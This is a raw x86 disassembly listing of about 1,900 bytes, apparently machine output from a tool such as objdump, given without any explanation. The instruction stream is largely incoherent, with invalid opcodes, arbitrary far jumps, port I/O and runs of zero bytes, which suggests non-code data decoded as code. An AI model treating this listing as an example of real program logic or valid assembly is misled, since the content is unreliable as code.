  448f86:	lods   al,BYTE PTR ds:[esi]
  448f87:	dec    edx
  448f88:	gs jmp 0x53a5:0xe5726fac
  448f90:	jne    0x448f22
  448f92:	das    
  448f93:	add    DWORD PTR [ecx+0x52],ebp
  448f96:	and    al,BYTE PTR [ecx]
  448f98:	pop    ebp
  448f99:	nop
  448f9a:	lahf   
  448f9b:	push   cs
  448f9c:	inc    ebp
  448f9d:	add    eax,0xd2690136
  448fa2:	inc    edx
  448fa3:	add    DWORD PTR [ebp-0x1c],ebx
  448fa6:	dec    eax
  448fa7:	and    ch,BYTE PTR [ecx-0x14]
  448faa:	jbe    0x448ffd
  448fac:	push   0x86126bf1
  448fb1:	xchg   edx,eax
  448fb2:	cwde   
  448fb3:	das    
  448fb4:	ins    BYTE PTR es:[edi],dx
  448fb5:	into   
  448fb6:	jp     0x448fb6
  448fb8:	push   0x792176de
  448fbd:	ret    
  448fbe:	jge    0x448fef
  448fc0:	fldcw  WORD PTR gs:[edi+0x2c]
  448fc4:	addr16 nop
  448fc6:	mov    esp,0xa5ad3f11
  448fcb:	sbb    al,0x5d
  448fcd:	add    BYTE PTR [eax],al
  448fcf:	add    BYTE PTR [eax],al
  448fd1:	add    BYTE PTR [edx-0x4998f454],ah
  448fd7:	xchg   esi,eax
  448fd8:	sbb    cl,BYTE PTR [edi-0x70]
  448fdb:	mov    ah,0xf
  448fdd:	push   ebx
  448fde:	cdq    
  448fdf:	int3   
  448fe0:	sbb    BYTE PTR [ebp+0x7d],bl
  448fe3:	popf   
  448fe4:	or     esp,DWORD PTR [ebp+0x6d]
  448fe7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448fe8:	add    eax,0x2dc5693e
  448fed:	dec    esp
  448fee:	imul   ebx,esi,0xc090002d
  448ff4:	(bad)  
  448ff6:	ins    DWORD PTR es:[edi],dx
  448ff7:	in     eax,0x38
  448ff9:	imul   ebp,DWORD PTR [ebp-0x12],0xf666673a
  449000:	sub    DWORD PTR [esi+0x36],esp
  449003:	clc    
  449004:	add    ah,BYTE PTR [ebp+0x31]
  449007:	add    eax,0xd92e670a
  44900c:	or     al,0x6b
  44900e:	xchg   edx,eax
  44900f:	mov    dl,0xb8
  449011:	and    BYTE PTR [esi+esi*2],bh
  449014:	cwde   
  449015:	xor    DWORD PTR es:[esi-0x55],edx
  449019:	sbb    al,0x35
  44901b:	dec    ebp
  44901c:	test   DWORD PTR [ebx],0x20b8b4a2
  449022:	cld    
  449023:	arpl   WORD PTR [esi-0x6db20bea],cx
  449029:	das    
  44902a:	jmp    0x3b482284
  44902f:	lods   eax,DWORD PTR ds:[esi]
  449030:	sub    BYTE PTR ds:0x1b313ef9,ah
  449036:	add    BYTE PTR [eax],al
  449038:	add    BYTE PTR [eax],al
  44903a:	add    dl,ah
  44903c:	arpl   WORD PTR [esi+0x1a],cx
  44903f:	mov    edi,0xf23b5256
  449044:	pop    esp
  449045:	pop    edx
  449046:	daa    
  449047:	mov    esp,0x8705ffb2
  44904c:	dec    ebp
  44904d:	sub    eax,DWORD PTR [edi-0x53]
  449050:	inc    esp
  449051:	and    eax,0x2b3eae21
  449056:	sbb    al,0xa2
  449058:	dec    ebp
  449059:	push   ss
  44905a:	and    cl,bl
  44905c:	dec    esi
  44905d:	test   DWORD PTR [ebx],0x2130b47f
  449063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449064:	jae    0x449050
  449066:	adc    eax,0x10194d82
  44906b:	push   esp
  44906c:	pop    edx
  44906d:	in     eax,0x20
  44906f:	jno    0x4490bf
  449071:	test   DWORD PTR [ebx],0x20a4ad52
  449077:	jl     0x4490d7
  449079:	mov    edi,0xdb514515
  44907e:	xor    esp,DWORD PTR [edx+0x59]
  449081:	test   al,0x15
  449083:	imul   edi,DWORD PTR [esi],0xb1ed03ce
  449089:	mov    ah,0x15
  44908b:	gs push ecx
  44908d:	push   cs
  44908e:	mov    ebp,0xb5636d70
  449093:	jo     0x4490df
  449095:	inc    ecx
  449096:	jmp    0xac517c2e
  44909b:	ins    BYTE PTR es:[edi],dx
  44909c:	inc    edx
  44909d:	inc    eax
  44909e:	add    BYTE PTR [eax],0x0
  4490a1:	add    BYTE PTR [eax],al
  4490a3:	add    BYTE PTR [eax+0x57],dh
  4490a6:	pop    ecx
  4490a7:	xchg   DWORD PTR [ecx+0x59],edx
  4490aa:	jp     0x449038
  4490ac:	xchg   ebx,eax
  4490ad:	and    DWORD PTR [ebx],edx
  4490af:	xchg   esp,eax
  4490b0:	test   eax,0xc1796f4f
  4490b5:	pop    ebx
  4490b6:	jae    0x44912e
  4490b8:	mov    edx,0x88505064
  4490bd:	addr16 push cs
  4490bf:	fst    QWORD PTR [eax-0x60a28c9f]
  4490c5:	push   esp
  4490c6:	jae    0x449107
  4490c8:	xor    BYTE PTR [edx+0x71949a0e],0x5c
  4490cf:	inc    esp
  4490d0:	jae    0x449128
  4490d2:	jae    0x449103
  4490d4:	fwait
  4490d5:	dec    esi
  4490d6:	jae    0x4490f4
  4490d8:	jae    0x44911c
  4490da:	pop    esi
  4490db:	adc    BYTE PTR [edx-0x6c16be9b],cl
  4490e1:	clc    
  4490e2:	or     eax,0x6f67862a
  4490e7:	adc    eax,0xc608777
  4490ec:	stos   BYTE PTR es:[edi],al
  4490ed:	push   esi
  4490ee:	inc    ecx
  4490ef:	jmp    0x1d57c487
  4490f4:	cwde   
  4490f5:	inc    ecx
  4490f6:	dec    edi
  4490f7:	std    
  4490f8:	lahf   
  4490f9:	dec    ebp
  4490fa:	ins    DWORD PTR es:[edi],dx
  4490fb:	jmp    0xb557c193
  449100:	jg     0x449143
  449102:	push   eax
  449103:	fstp   TBYTE PTR [esi+0x67]
  449106:	push   cs
  449107:	cli    
  449108:	add    BYTE PTR [eax],al
  44910a:	add    BYTE PTR [eax],al
  44910c:	add    BYTE PTR [ecx+0xd005d4e],dl
  449112:	mov    al,ds:0xa9096d6d
  449117:	dec    edi
  449118:	add    ch,bl
  44911a:	mov    bl,0x72
  44911c:	jae    0x44911b
  44911e:	lahf   
  44911f:	ins    DWORD PTR es:[edi],dx
  449120:	ins    DWORD PTR es:[edi],dx
  449121:	or     DWORD PTR [ecx-0x3ab7ffa7],ebp
  449127:	pop    edx
  449128:	imul   edi,ebx,0x15617bb5
  44912e:	sbb    DWORD PTR [edi+ebp*2+0xd],0x79746da5
  449136:	mov    cl,0x99
  449138:	add    al,0x1b
  44913a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44913b:	jb     0x4491a2
  44913d:	or     BYTE PTR [esi-0x5d33b2b5],bl
  449143:	dec    ebx
  449144:	js     0x4491bf
  449146:	mov    cl,0xf
  449148:	add    DWORD PTR [edx-0x429eb464],ebp
  44914e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44914f:	pop    edx
  449150:	push   0x646fa58b
  449155:	cmp    DWORD PTR [ecx-0x5660fa46],esi
  44915b:	pop    esp
  44915c:	je     0x4491da
  44915e:	xchg   ecx,eax
  44915f:	jb     0x4491b2
  449161:	mov    WORD PTR [ebp-0x499386a4],fs
  449167:	push   cs
  449168:	add    BYTE PTR [edx-0x4e],ah
  44916b:	cmp    al,0x65
  44916d:	mov    BYTE PTR [edx+0x723e],dl
  449173:	add    BYTE PTR [eax],al
  449175:	add    BYTE PTR [esi+0xa734b8f],ah
  44917b:	jl     0x4491c8
  44917d:	ins    DWORD PTR es:[edi],dx
  44917e:	xchg   esi,eax
  44917f:	pushf  
  449180:	add    BYTE PTR [bp+di+0x5ac4],bh
  449185:	imul   ecx,ebx,0xd5617bb4
  44918b:	sbb    BYTE PTR [edi+ebp*2-0x70],0xe7
  449190:	pop    es
  449191:	arpl   WORD PTR [esi+ecx*1+0x15],bx
  449195:	add    BYTE PTR [eax+0x394de81f],dl
  44919b:	or     DWORD PTR [ecx],ebx
  44919d:	ins    DWORD PTR es:[edi],dx
  44919e:	xor    edi,ebp
  4491a0:	dec    ebx
  4491a1:	fs and al,0x4
  4491a4:	xor    bh,BYTE PTR ds:0xfa0cdb28
  4491aa:	(bad)  
  4491ab:	cld    
  4491ac:	add    ch,BYTE PTR [ecx+0x24]
  4491af:	ss sbb eax,0x8382772
  4491b5:	jae    0x4491ba
  4491b7:	inc    DWORD PTR [edi]
  4491b9:	test   DWORD PTR gs:[edi+0x14],0xcb89000
  4491c1:	aas    
  4491c2:	in     eax,dx
  4491c3:	cmp    eax,0x5efd6752
  4491c8:	xor    esp,DWORD PTR [esi-0x14]
  4491cb:	xchg   ebp,eax
  4491cc:	or     esp,DWORD PTR [esi-0xb]
  4491cf:	test   BYTE PTR [edx],dl
  4491d1:	cmp    DWORD PTR [edx-0x2b93d074],edx
  4491d7:	xchg   DWORD PTR [ebx],ecx
  4491d9:	outs   dx,BYTE PTR ds:[esi]
  4491da:	add    BYTE PTR [eax],al
  4491dc:	add    BYTE PTR [eax],al
  4491de:	add    BYTE PTR [ebp-0x4a8fe463],ch
  4491e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4491e5:	adc    ch,cl
  4491e7:	xchg   edx,eax
  4491e8:	mov    WORD PTR [edi],gs
  4491ea:	ins    BYTE PTR es:[edi],dx
  4491eb:	ret    
  4491ec:	xchg   edx,eax
  4491ed:	std    
  4491ee:	imul   ebp,DWORD PTR [ebp-0x49a2b14a],0xffffffba
  4491f5:	jmp    DWORD PTR [ebx-0x64]
  4491f8:	jle    0x449225
  4491fa:	inc    esp
  4491fb:	jno    0x449198
  4491fd:	or     DWORD PTR [ebp+0x71],ebp
  449200:	lods   al,BYTE PTR ds:[esi]
  449201:	das    
  449202:	add    BYTE PTR [eax+0x6d3f0eca],dl
  449208:	mov    ebp,0xb2776720
  44920d:	mov    esi,0xb3567122
  449212:	adc    DWORD PTR [ecx+0x3c],ebp
  449215:	ficom  DWORD PTR [edx]
  449217:	nop
  449218:	mov    dl,0x33
  44921a:	add    cl,BYTE PTR [edi+0x4233ab4d]
  449220:	push   ebx
  449221:	aam    0x20
  449223:	inc    ebx
  449224:	aas    
  449225:	mov    ebx,DWORD PTR [ebp*1+0x2503a44d]
  44922c:	mov    al,0xb8
  44922e:	and    BYTE PTR [esi*2+0x562d1f98],dh
  449235:	call   0xf135:0x9256293d
  44923c:	push   ebp
  44923d:	call   0xfd:0xc6b2902e
  449244:	add    BYTE PTR [eax],al
  449246:	add    BYTE PTR [eax],al
  449248:	repz aas 
  44924a:	imul   edx,DWORD PTR [ecx],0xfffffff3
  44924d:	push   ebp
  44924e:	addr16 cs nop
  449251:	mov    dl,0x35
  449253:	add    esp,DWORD PTR [edi-0xedda7aa]
  449259:	push   esi
  44925a:	xor    ah,BYTE PTR [ecx]
  44925c:	in     eax,dx
  44925d:	push   ebx
  44925e:	inc    ebp
  44925f:	or     eax,0x10563ee3
  449264:	mov    ch,0x3f
  449266:	xor    cl,BYTE PTR [eax+edx*4]
  449269:	mov    dl,0xc2
  44926b:	add    dh,BYTE PTR [edi+0x4d]
  44926e:	and    esi,DWORD PTR [ecx]
  449270:	mov    ds:0xc540054d,eax
  449275:	dec    esp
  449276:	push   ss
  449277:	adc    DWORD PTR [esi+edi*1+0x51cc3d2a],esi
  44927e:	jmp    0x18960fa1
  449283:	and    DWORD PTR [eax-0x40fe5c4e],edx
  449289:	dec    ebp
  44928a:	push   cs
  44928b:	std    
  44928c:	mov    bh,0x59
  44928e:	pop    ebp
  44928f:	add    ch,BYTE PTR [esi-0x5d338cc0]
  449295:	inc    edx
  449296:	outs   dx,DWORD PTR ds:[esi]
  449297:	retf   0x85b0
  44929a:	mov    si,0xa493
  44929e:	or     eax,0x405670a6
  4492a3:	(bad)  
  4492a4:	lahf   
  4492a5:	push   ebp
  4492a6:	jnp    0x44926c
  4492a8:	jl     0x4492f6
  4492aa:	jo     0x449272
  4492ac:	add    BYTE PTR [eax],al
  4492ae:	add    BYTE PTR [eax],al
  4492b0:	add    BYTE PTR [ecx-0x734a90b3],ah
  4492b6:	dec    ebx
  4492b7:	js     0x449277
  4492b9:	xchg   ebx,eax
  4492ba:	pop    ebx
  4492bb:	adc    edi,DWORD PTR [edx-0x668c9a79]
  4492c1:	xchg   ebx,eax
  4492c2:	das    
  4492c3:	adc    esi,DWORD PTR [ebp-0x73aeba59]
  4492c9:	xchg   edi,eax
  4492ca:	jo     0x44933b
  4492cc:	lea    esp,[eax-0x6f92f1a1]
  4492d2:	outs   dx,BYTE PTR ds:[esi]
  4492d3:	jp     0x44934f
  4492d5:	mov    ds:0xb33f625f,al
  4492da:	push   esi
  4492db:	arpl   WORD PTR [esp+edx*4+0x59],ax
  4492df:	adc    edi,DWORD PTR ds:0x407b4477
  4492e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4492e6:	push   ebx
  4492e7:	bound  ecx,QWORD PTR [esp+edi*2+0x44]
  4492eb:	jns    0x449337
  4492ed:	lahf   
  4492ee:	inc    ebp
  4492ef:	pop    ebp
  4492f0:	jmp    0x1b56ab88
  4492f5:	pop    DWORD PTR [ebp+0x73]
  4492f8:	sbb    eax,0xf735067
  4492fd:	xor    BYTE PTR [edx+0x7691a90e],0x79
  449304:	or     BYTE PTR [eax-0x64ff888a],dh
  44930a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44930b:	outs   dx,DWORD PTR ds:[esi]
  44930c:	jb     0x44929e
  44930e:	jne    0x44931e
  449310:	add    al,bh
  449312:	mov    dl,0x57
  449314:	outs   dx,BYTE PTR ds:[esi]
  449315:	add    BYTE PTR [eax],al
  449317:	add    BYTE PTR [eax],al
  449319:	add    ch,ah
  44931b:	mov    al,ds:0x92be6c5c
  449320:	jne    0x449387
  449322:	aad    0x7c
  449324:	jo     0x449389
  449326:	mov    ebx,0xf6573a0
  44932b:	mov    dl,0xe
  44932d:	add    ah,bl
  44932f:	mov    dl,0x57
  449331:	outs   dx,BYTE PTR ds:[esi]
  449332:	add    eax,0xce6c5ca1
  449337:	xchg   edx,eax
  449338:	jne    0x44939f
  44933a:	aad    0x81
  44933c:	dec    ebx
  44933d:	arpl   WORD PTR [ebx],cx
  44933f:	mov    eax,ds:0xb20f6573
  449344:	push   cs
  449345:	add    BYTE PTR [ebp+0x14753dc1],bh
  44934b:	mov    ds:0xa3145067,eax
  449350:	dec    eax
  449351:	outs   dx,DWORD PTR ds:[esi]
  449352:	sti    
  449353:	test   al,0x6f
  449355:	outs   dx,BYTE PTR ds:[esi]
  449356:	or     ah,BYTE PTR [eax-0x581b90b3]
  44935c:	jp     0x4493c3
  44935e:	retf   
  44935f:	mov    dh,0x73
  449361:	add    DWORD PTR [esi+ebp*4-0x5b668b89],esi
  449368:	jno    0x4493cd
  44936a:	aam    0xa3
  44936c:	pop    ebp
  44936d:	add    bh,al
  44936f:	rcl    BYTE PTR [edi+0x54],0x9a
  449373:	jg     0x4493c0
  449375:	je     0x4493df
  449377:	xchg   ebx,eax
  449378:	jp     0x4493e3
  44937a:	addr16 mov eax,ds:0x6f4d
  44937e:	add    BYTE PTR [eax],al
  449380:	add    BYTE PTR [eax],al
  449382:	add    BYTE PTR [edi-0x5d],bh
  449385:	jno    0x4493f3
  449387:	xchg   esp,eax
  449388:	or     DWORD PTR [ebx+0x73],0xffffff90
  44938c:	pushf  
  44938d:	add    eax,0x2e927e67
  449392:	add    BYTE PTR [eax+0x6c3e0c66],dl
  449398:	(bad)  
  449399:	std    
  44939a:	addr16 dec esi
  44939c:	mov    dl,0x6
  44939e:	pop    ebp
  44939f:	push   edx
  4493a0:	(bad)  
  4493a1:	or     bl,BYTE PTR [esi+0x6d]
  4493a4:	(bad)  
  4493a6:	call   DWORD PTR [eax+0x624be845]
  4493ac:	loop   0x4493d5
  4493ae:	inc    sp
  4493b0:	idiv   dh
  4493b2:	inc    edx
  4493b3:	inc    edx
  4493b4:	loop   0x4493ce
  4493b6:	imul   esi,DWORD PTR [ebx],0x2d5300ea
  4493bc:	in     al,dx
  4493bd:	sbb    BYTE PTR [ecx+0x3f],ch
  4493c0:	add    DWORD PTR ds:0x2c008db9,ecx
  4493c6:	imul   esp,DWORD PTR [ecx+ebx*1],0x1e457202
  4493cd:	add    DWORD PTR [ecx+edi*8+0x19],ebp
  4493d1:	add    DWORD PTR [ebp-0x29],ebx
  4493d4:	sub    eax,DWORD PTR [edi]
  4493d6:	pop    ebp
  4493d7:	repz inc ebp
  4493d9:	(bad)  
  4493da:	call   DWORD PTR [eax-0xab7f1e3]
  4493e0:	sub    bh,ch
  4493e2:	push   ecx
  4493e3:	in     eax,dx
  4493e4:	mov    bl,dh
  4493e6:	arpl   WORD PTR [eax],ax
  4493e8:	add    BYTE PTR [eax],al
  4493ea:	add    BYTE PTR [eax],al
  4493ec:	out    dx,eax
  4493ed:	ins    BYTE PTR es:[edi],dx
  4493ee:	adc    bh,BYTE PTR [edx+0x6bf79092]
  4493f4:	loopne 0x449451
  4493f6:	frstor [edx-0x53]
  4493f9:	jl     0x4493dc
  4493fb:	inc    edi
  4493fc:	mov    ch,0x6a
  4493fe:	loop   0x4493ff
  449400:	aaa    
  449401:	nop
  449402:	adc    BYTE PTR [edi],bh
  449404:	mov    ch,0x85
  449406:	xlat   BYTE PTR ds:[ebx]
  449407:	ja     0x4493c2
  449409:	mov    dl,0xb
  44940b:	(bad)  
  44940c:	mov    dh,0x56
  44940e:	adc    bl,al
  449410:	scas   eax,DWORD PTR es:[edi]
  449411:	inc    esp
  449412:	sbb    ah,ch
  449414:	imul   esi,DWORD PTR [edx+0x55c70611],0xffffffeb
  44941b:	retf   
  44941c:	jo     0x44946e
  44941e:	adc    esi,eax
  449420:	push   esp
  449421:	imul   edx,DWORD PTR [ecx],0xea4476ea
  449427:	in     al,0x7b
  449429:	dec    ecx
  44942a:	shl    cl,0xdf
  44942d:	mov    edi,0x434906ec
  449432:	mov    ch,0xe4
  449434:	imul   esp,DWORD PTR [edx+edx*8-0x1c],0x6b
  449439:	bound  ebp,QWORD PTR [ebx-0xd40400b]
  44943f:	pop    es
  449440:	dec    edi
  449441:	inc    edx
  449442:	(bad)  
  449444:	push   esp
  449445:	inc    ebp
  449446:	mov    ds:0xf7671fe8,eax
  44944b:	add    ebx,DWORD PTR [ebx+0xe8a4b6]
  449451:	add    BYTE PTR [eax],al
  449453:	add    BYTE PTR [eax],al
  449455:	sub    esi,DWORD PTR [ebp-0x7b]
  449458:	cmc    
  449459:	test   BYTE PTR [edx+ecx*4-0xe],0xeb
  44945e:	push   ebp
  44945f:	test   DWORD PTR [ebx],0xe8b0b16b
  449465:	jmp    0x4494da
  449467:	nop
  449468:	lock inc DWORD PTR [ebp+0x63]
  44946c:	call   0xf19b0552
  449471:	mov    esp,0x8e03f767
  449476:	mov    eax,0x44bbf753
  44947b:	push   esp
  44947c:	in     eax,0xbb
  44947e:	test   DWORD PTR [bp+di],0xf438b344
  449485:	aam    0x50
  449487:	push   cs
  449488:	sub    al,0x2a
  44948a:	pop    esi
  44948b:	js     0x4494c2
  44948d:	dec    ebx
  44948e:	mov    edi,0x7e94e0e8
  449493:	arpl   WORD PTR [ecx],bx
  449495:	and    BYTE PTR [edx+0x6d],cl
  449498:	or     BYTE PTR [eax],cl
  44949a:	pop    esi
  44949b:	push   esi
  44949c:	or     BYTE PTR [edx],al
  44949e:	pop    ebx
  44949f:	jp     0x4494ad
  4494a1:	xchg   esp,eax
  4494a2:	sahf   
  4494a3:	or     al,0x26
  4494a5:	jmp    0xe640e1f4
  4494aa:	inc    eax
  4494ab:	jae    0x4494ac
  4494ad:	fild   QWORD PTR [esi+0x5c]
  4494b0:	(bad)  
  4494b1:	neg    BYTE PTR [ebp+0x5d]
  4494b4:	fcmovb st,st(4)
  4494b6:	pop    edx
  4494b7:	push   cs
  4494b8:	inc    esi
  4494b9:	add    BYTE PTR [eax],al
  4494bb:	add    BYTE PTR [eax],al
  4494bd:	add    BYTE PTR [ebx-0x533ba38d],dl
  4494c3:	dec    edx
  4494c4:	jae    0x44945f
  4494c6:	lds    edx,FWORD PTR [edi+0x6d]
  4494c9:	les    edi,FWORD PTR [esi-0x6c16bebd]
  4494cf:	or     eax,0x43b89b12
  4494d4:	arpl   WORD PTR [eax+ebp*4-0x57648996],dx
  4494db:	push   ecx
  4494dc:	jb     0x4494c7
  4494de:	xchg   ebx,eax
  4494df:	fisttp WORD PTR [esp+ebx*4]
  4494e2:	adc    BYTE PTR [eax+0x73],0xaf
  4494e6:	ins    BYTE PTR es:[edi],dx
  4494e7:	push   edx
  4494e8:	jae    0x44948e
  4494ea:	jnp    0x449559
  4494ec:	push   cs
  4494ed:	call   DWORD PTR [esi+0x58757361]
  4494f3:	pop    eax
  4494f4:	jb     0x44952c
  4494f6:	push   0xffffff80
  4494f8:	ja     0x449547
  4494fa:	outs   dx,DWORD PTR ds:[esi]
  4494fb:	mov    esi,0x6196e0e8
  449500:	jae    0x449557
  449502:	pop    edx
  449503:	dec    ebx
  449504:	jp     0x449506
  449506:	int3   
  449507:	out    0x6f,al
  449509:	imul   eax,edi,0x7c7249ba
  44950f:	mov    esi,0xb545ffe8
  449514:	cmp    eax,0x75e87d65
  449519:	ins    BYTE PTR es:[edi],dx
  44951a:	mov    edx,ds
  44951c:	jne    0x44958b
  44951e:	pushf  
  44951f:	mov    dh,0x58
  449521:	add    al,BYTE PTR [eax]
  449523:	add    BYTE PTR [eax],al
  449525:	add    BYTE PTR [eax],al
  449527:	scas   al,BYTE PTR es:[edi]
  449528:	aad    0x74
  44952a:	inc    esi
  44952b:	mov    al,ds:0xa05449c2
  449530:	int    0x49
  449532:	add    dl,bl
  449534:	mov    al,0x2a
  449536:	gs in  eax,0xd4
  449539:	je     0x4495a0
  44953b:	das    
  44953c:	leave  
  44953d:	ins    BYTE PTR es:[edi],dx
  44953e:	gs push ds
  449540:	mov    dl,0x3e
  449542:	add    bh,dh
  449544:	aam    0x74
  449546:	inc    esi
  449547:	ror    ch,1
  449549:	dec    ecx
  44954a:	dec    ecx
  44954b:	out    0xcb,eax
  44954d:	outs   dx,DWORD PTR ds:[esi]
  44954e:	jb     0x449514
  449550:	shl    BYTE PTR [ecx+ebp*2-0x2a],1
  449554:	ret    
  449555:	dec    esi
  449556:	jns    0x449549
  449558:	shl    BYTE PTR [edx+0x64],1
  44955b:	add    eax,0x12ffe8d5
  449560:	mov    dh,0x5b
  449562:	outs   dx,BYTE PTR ds:[esi]
  449563:	sub    edx,esp
  449565:	inc    edi
  449566:	imul   ebp,DWORD PTR [edx],0x1e7249c5
  44956c:	shl    BYTE PTR [ebp+0x74],1
  44956f:	imul   esi,DWORD PTR [ecx-0x2bf4fb81],0xc5ea6947
  449579:	dec    ecx
  44957a:	jb     0x44951a
  44957c:	shl    DWORD PTR [ebp+0x74],1
  44957f:	scas   eax,DWORD PTR es:[edi]
  449580:	ret    
  449581:	pop    esi
  449582:	push   ebx
  449583:	nop
  449584:	jb     0x449562
  449586:	pop    esi
  449587:	mov    ah,0x76
  449589:	mov    edi,0x61
  44958e:	add    BYTE PTR [eax],al
  449590:	stos   BYTE PTR es:[edi],al
  449591:	outs   dx,BYTE PTR ds:[esi]
  449592:	repz imul edx,DWORD PTR [eax-0x46b1efc8],0x79
  44959a:	out    0x6c,al
  44959c:	mov    cl,0x7f
  44959e:	mov    ebp,0xe599b56c
  4495a3:	call   DWORD PTR [edi]
  4495a5:	call   0x9fb9d4bc
  4495aa:	shr    DWORD PTR [edx+eax*4-0x67],cl
  4495ae:	icebp  
  4495af:	test   BYTE PTR gs:[ebx-0x498c9920],bl
  4495b6:	jecxz  0x44962a
  4495b8:	nop
  4495b9:	mov    al,0x13
  4495bb:	dec    ecx
  4495bc:	jbe    0x449585
  4495be:	out    dx,eax
  4495bf:	jno    0x44962d
  4495c1:	in     al,0xf1
  4495c3:	push   0x6d
  4495c5:	not    ecx
  4495c7:	cmp    ax,0xebdb
  4495cb:	jno    0x4495fa
  4495cd:	push   ss
  4495ce:	in     eax,0x62
  4495d0:	sub    dl,ch
  4495d2:	ficomp WORD PTR [esi+0x2d]
  4495d5:	retf   
  4495d6:	or     al,0xa6
  4495d8:	xchg   ecx,eax
  4495d9:	or     eax,0xf3236cf9
  4495de:	shl    DWORD PTR [ebp+0x23],cl
  4495e1:	pop    ds
  4495e2:	jecxz  0x449650
  4495e4:	xor    esp,DWORD PTR [edi]
  4495e6:	hlt    
  4495e7:	data16 dec BYTE PTR [eax]
  4495ea:	in     al,dx
  4495eb:	(bad)  
  4495ec:	clc    
  4495ed:	ss or  eax,0xf00c9242
  4495f3:	imul   eax,DWORD PTR [eax],0x0
  4495f6:	add    BYTE PTR [eax],al
  4495f8:	add    ch,cl
  4495fa:	sub    esp,edi
  4495fc:	push   0x64df34e2
  449601:	in     eax,dx
  449602:	cmp    esp,ecx
  449604:	dec    ebp
  449605:	icebp  
  449606:	mov    dl,0x45
  449608:	in     eax,dx
  449609:	lock push eax
  44960b:	pop    ebx
  44960c:	jmp    0x83448ef
  449611:	iret   
  449612:	inc    edx
  449613:	push   edx
  449614:	out    dx,al
  449615:	iret   
  449616:	inc    eax
  449617:	inc    eax
  449618:	jecxz  0x4495ee
  44961a:	aas    
  44961b:	and    al,0x4
  44961d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44961e:	mov    ch,0xb
  449620:	in     al,dx
  449621:	mov    eax,ds:0x62e85655
  449626:	cmp    BYTE PTR [ecx],0xed
  449629:	mov    eax,ds:0x1004033f
  44962e:	mov    dh,0x2b
  449630:	in     al,dx
  449631:	adc    DWORD PTR [ebp+0x16],0x2180c2e8
  449638:	jmp    0x43bdcbc
  44963d:	call   0xe351:0x44f234b1
  449644:	call   0xf004e194
  449649:	outs   dx,DWORD PTR ds:[esi]
  44964a:	push   ebp
  44964b:	fcomi  st,st(3)
  44964d:	add    BYTE PTR [eax+0x4230eda4],0xc4
  449654:	jmp    0x44968c
  449656:	inc    esi
  449657:	test   DWORD PTR [ebx],0xe883b540
  44965d:	add    BYTE PTR [eax],al
  44965f:	add    BYTE PTR [eax],al
  449661:	add    BYTE PTR [ecx],ah
  449663:	dec    ebp
  449664:	into   
  449665:	in     eax,dx
  449666:	xor    BYTE PTR [esi-0x2e],al
  449669:	xlat   BYTE PTR ds:[ebx]
  44966a:	aaa    
  44966b:	inc    eax
  44966c:	call   0xd304:0x7b23be4
  449673:	inc    eax
  449674:	call   0xf4e8:0xa555fbe4
  44967b:	dec    ebx
  44967c:	imul   ebp,eax,0xffffffcb
  44967f:	dec    edx
  449680:	gs call 0xe952ed76
  449686:	xchg   ebx,eax
  449687:	mov    dl,BYTE PTR [edx]
  449689:	cdq    
  44968a:	popa   
  44968b:	push   esp
  44968c:	ins    DWORD PTR es:[edi],dx
  44968d:	dec    esp
  44968e:	arpl   WORD PTR [eax+0x1d],ax
  449691:	sbb    edx,DWORD PTR [esi+0x4a]
  449694:	pop    esp
  449695:	pop    edx
  449696:	dec    eax
  449697:	ins    BYTE PTR es:[edi],dx
  449698:	push   cs
  449699:	add    ecx,DWORD PTR [eax+0x33565c62]
  44969f:	pop    esi
  4496a0:	pop    ebp
  4496a1:	cmp    ah,BYTE PTR [ebx-0x80]
  4496a4:	pop    eax
  4496a5:	dec    esp
  4496a6:	and    al,0x47
  4496a8:	inc    ecx
  4496a9:	jmp    0x2e522141
  4496ae:	sub    DWORD PTR [edi+0x40],eax
  4496b1:	push   cs
  4496b2:	add    BYTE PTR [esi+0x7b],cl
  4496b5:	or     al,0xd6
  4496b7:	push   ecx
  4496b8:	jnp    0x4496be
  4496ba:	(bad)  
  4496bb:	push   ebx
  4496bc:	pop    esp
  4496bd:	pop    ds
  4496be:	out    0x4e,eax
  4496c0:	arpl   WORD PTR [ecx+edi*8],cx
  4496c3:	jne    0x44973e
  4496c5:	cld    
  4496c6:	add    BYTE PTR [eax],al
  4496c8:	add    BYTE PTR [eax],al
  4496ca:	add    ch,dh
  4496cc:	inc    esi
  4496cd:	ds (bad) 
  4496cf:	in     al,dx
  4496d0:	push   esp
  4496d1:	bound  edi,QWORD PTR [esi-0x44ac986d]
  4496d7:	fnstsw WORD PTR [ebp+0x5a]
  4496da:	sbb    al,BYTE PTR [edx-0x50428d6c]
  4496e0:	mov    edx,0x6f8c12e8
  4496e5:	jbe    0x4496af
  4496e7:	mov    eax,ds:0xb8be796e
  4496ec:	inc    eax
  4496ed:	dec    edi
  4496ee:	jmp    0xbd521786
  4496f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4496f4:	ins    DWORD PTR es:[edi],dx
  4496f5:	js     0x449687
  4496f7:	jb     0x44974a
  4496f9:	jb     0x449687
  4496fb:	xchg   ebx,eax
  4496fc:	mov    ecx,DWORD PTR [edi]
  4496fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4496ff:	push   0x1d004d4e
  449704:	(bad)  
  449705:	js     0x449769
  449707:	push   ds
  449708:	iret   
  449709:	pop    esi
  44970a:	fs xor eax,0x696174cf
  449710:	mov    dh,0x46
  449712:	add    DWORD PTR [esi-0x2bb48b2f],esp
  449718:	mov    ebp,0xc4d86f6e
  44971d:	inc    esp
  44971e:	push   ebx
  44971f:	in     eax,0xd5
  449721:	je     0x449788
  449723:	sub    DWORD PTR [esi-0x3b7afcdb],esi
  449729:	ins    DWORD PTR es:[edi],dx
  44972a:	outs   dx,BYTE PTR ds:[esi]
  44972b:	push   0xffffffc2
  44972d:	ins    DWORD PTR es:[edi],dx
  44972e:	je     0x449730
  449730:	add    BYTE PTR [eax],al
  449732:	add    BYTE PTR [eax],al
  449734:	aam    0xe9
  449736:	dec    ecx
  449737:	jae    0x4497b3
  449739:	aad    0x47
  44973b:	gs stc 
  44973d:	mov    ch,0xa4
